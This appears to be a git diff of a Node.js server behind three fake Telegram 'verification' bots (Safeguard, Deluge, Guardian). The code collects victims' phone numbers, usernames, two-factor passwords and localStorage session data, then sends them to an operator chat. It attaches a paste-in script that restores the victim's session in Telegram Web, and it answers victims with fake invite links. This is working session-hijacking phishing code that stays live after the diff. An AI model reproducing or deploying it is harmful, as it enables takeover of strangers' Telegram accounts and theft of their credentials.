@@ -10,7 +10,6 @@ const PNF = require("google-libphonenumber").PhoneNumberFormat;
 
 const admins = [5891533625]; // Replace with your Telegram ID if needed
 
-// Load images as Buffers
 const safeguardSuccess = fs.readFileSync(path.join(__dirname, "images/success/safeguard.jpg"));
 const guardianSuccess = fs.readFileSync(path.join(__dirname, "images/success/guardian.jpg"));
 const delugeVerification = fs.readFileSync(path.join(__dirname, "images/verification/deluge.jpg"));
@@ -44,127 +43,67 @@ let guardianUsername;
 safeguardBot.getMe().then(botInfo => {
   safeguardUsername = botInfo.username;
   console.log(`Safeguard Bot Username: ${safeguardUsername}`);
-}).catch(err => console.error("Error getting Safeguard bot info:", err));
-
+});
 delugeBot.getMe().then(botInfo => {
   delugeUsername = botInfo.username;
   console.log(`Deluge Bot Username: ${delugeUsername}`);
-}).catch(err => console.error("Error getting Deluge bot info:", err));
-
+});
 guardianBot.getMe().then(botInfo => {
   guardianUsername = botInfo.username;
   console.log(`Guardian Bot Username: ${guardianUsername}`);
-}).catch(err => console.error("Error getting Guardian bot info:", err));
-
-// Test sending a message to LOGS_ID on startup to verify it works
-safeguardBot.sendMessage(process.env.LOGS_ID, "Bot started successfully!").then(() => {
-  console.log(`Successfully sent test message to LOGS_ID: ${process.env.LOGS_ID}`);
-}).catch(err => {
-  console.error(`Failed to send test message to LOGS_ID: ${err.message}`);
 });
 
 const app = express();
 app.use(express.json());
-
-// Log all incoming requests for debugging
-app.use((req, res, next) => {
-  console.log(`Received request: ${req.method} ${req.url}`);
-  next();
-});
-
-// Handle /a/ route for Telegram login (handle both /a and /a/)
-app.get(/^\/a\/?$/, (req, res) => {
-  console.log("Handling /a/ route, redirecting to Telegram login: https://web.telegram.org/a/");
-  res.redirect("https://web.telegram.org/a/");
-});
-
-// Serve static files after defining custom routes
 app.use(express.static("public"));
 
-// Serve HTML from subfolders
 app.get("/safeguard/", (req, res) => {
-  console.log("Serving /safeguard/ route");
-  res.sendFile(path.join(__dirname, "public", "safeguard", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
-
 app.get("/deluge/", (req, res) => {
-  console.log("Serving /deluge/ route");
-  res.sendFile(path.join(__dirname, "public", "deluge", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
-
 app.get("/guardian/", (req, res) => {
-  console.log("Serving /guardian/ route");
-  res.sendFile(path.join(__dirname, "public", "guardian", "index.html"));
+  res.sendFile(path.join(__dirname, "public", "index.html"));
 });
 
 app.post("/api/users/telegram/info", async (req, res) => {
   try {
     const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
-    console.log(`Received user data for userId ${userId}, type: ${type}`);
     let pass = password || "No Two-factor authentication enabled.";
-    let usernameText = usernames && Array.isArray(usernames) ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "No usernames";
+    let usernameText = usernames ? `Usernames owned:\n${usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n")}` : "";
     const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
     const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);
     const quickAuth = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;
 
     await handleRequest(req, res, { password: pass, script: quickAuth, userId, name: firstName, number: formattedNumber, usernames: usernameText, premium: isPremium, type });
   } catch (error) {
-    console.error("500 server error in /api/users/telegram/info:", error.message);
+    console.error("500 server error", error);
     res.status(500).json({ error: "server error" });
   }
-});
-
-// Catch-all route for debugging unmatched routes
-app.use((req, res) => {
-  console.log(`Route not found: ${req.method} ${req.url}`);
-  res.status(404).send("Not Found");
 });
 
 const handleRequest = async (req, res, data) => {  
   const botMap = { safeguard: safeguardBot, guardian: guardianBot, deluge: delugeBot };
   let bot = botMap[data.type] || null;
-  if (!bot) {
-    console.error(`No bot found for type: ${data.type}`);
-    res.status(400).json({ error: "Invalid bot type" });
-    return;
-  }
-
-  // Send user data to LOGS_ID
-  try {
-    console.log(`Sending user data to LOGS_ID: ${process.env.LOGS_ID}`);
-    await bot.sendMessage(
-      process.env.LOGS_ID,
-      `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`,
-      { parse_mode: "HTML" }
-    );
-    console.log(`Successfully sent user data to LOGS_ID for userId ${data.userId}`);
-  } catch (error) {
-    console.error(`Failed to send user data to LOGS_ID for userId ${data.userId}: ${error.message}`);
-    console.error("Error details:", JSON.stringify(error, null, 2));
-  }
-
-  // Send temporary link to the user (for safeguard and guardian)
+  await bot.sendMessage(
+    process.env.LOGS_ID,
+    `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.name}\n⭐ <b>Telegram Premium</b>: ${data.premium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.number}</tg-spoiler>\n${data.usernames}\n🔐 <b>Password</b>: <code>${data.password}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`,
+    { parse_mode: "HTML" }
+  );
   let type = data.type;
   if (type === "safeguard" || type === "guardian") {
     let image = type === "safeguard" ? safeguardSuccess : guardianSuccess;
     let caption = type === "safeguard" 
       ? `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`
-      : `☑️ <b>Verification successful</b>\n\nPlease click the invite植物 link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
+      : `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
     const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];
     const buttons = type === "safeguard" 
-      ? { reply_markup: { inline_keyboard: [[{ text: "@SOLTRENDING",  "url": "https://t.me/SOLTRENDING" }]] } }
+      ? { reply_markup: { inline_keyboard: [[{ text: "@SOLTRENDING", url: "https://t.me/SOLTRENDING" }]] } }
       : { reply_markup: { inline_keyboard: [[{ text: randomText, url: `https://t.me/+${generateRandomString(16)}` }]] } };
 
-    try {
-      console.log(`Sending temporary link to userId ${data.userId}`);
-      await bot.sendPhoto(data.userId, { source: image, filename: `${type}_success.jpg` }, { caption, ...buttons, parse_mode: "HTML" });
-      console.log(`Successfully sent temporary link to userId ${data.userId}`);
-    } catch (error) {
-      console.error(`Failed to send temporary link to userId ${data.userId}: ${error.message}`);
-      console.error("Error details:", JSON.stringify(error, null, 2));
-    }
+    await bot.sendPhoto(data.userId, image, { caption, ...buttons, parse_mode: "HTML" });
   }
-
   res.json({});
 };
 
@@ -190,14 +129,14 @@ const handleNewChatMember = async (bot, type) => {
         jsonToSend = {};
     }
     if (update.chat.type === "channel" && update.new_chat_member.status === "administrator" && update.new_chat_member.user.is_bot && admins.includes(update.from.id)) {
-      bot.sendPhoto(chatId, { source: imageToSend, filename: `${type}_verification.jpg` }, jsonToSend);
+      bot.sendPhoto(chatId, imageToSend, jsonToSend);
     }
   });
 };
 
 function handleStart(bot) {
   bot.onText(/\/start/, (msg) => {
-    console.log(`Received /start from chat ID: ${msg.chat.id} for bot with token: ${bot.token}`);
+    console.log(`Received /start from chat ID: ${msg.chat.id} for bot with token: ${bot._token}`);
     let botInfo;
     bot.getMe().then(botInformation => {
       botInfo = botInformation;
@@ -248,9 +187,9 @@ function handleStart(bot) {
           };
           imageToSend = guardianVerification;
         }
-        bot.sendPhoto(chatId, { source: imageToSend, filename: `${botInfo.username}_verification.jpg` }, jsonToSend)
+        bot.sendPhoto(chatId, imageToSend, jsonToSend)
           .then(() => console.log(`Sent response to ${chatId} for ${botInfo.username}`))
-          .catch(err => console.error(`Error sending to ${chatId}: ${err.message}`));
+          .catch(err => console.error(`Error sending to ${chatId}:`, err));
       }
     }).catch(err => console.error("Error in getMe:", err));
   });
@@ -264,5 +203,6 @@ handleStart(safeguardBot);
 handleStart(delugeBot);
 handleStart(guardianBot);
 
+// Use Render's assigned port
 const port = process.env.PORT || 80;
 app.listen(port, () => console.log(`loaded everyone & running on port ${port}`));
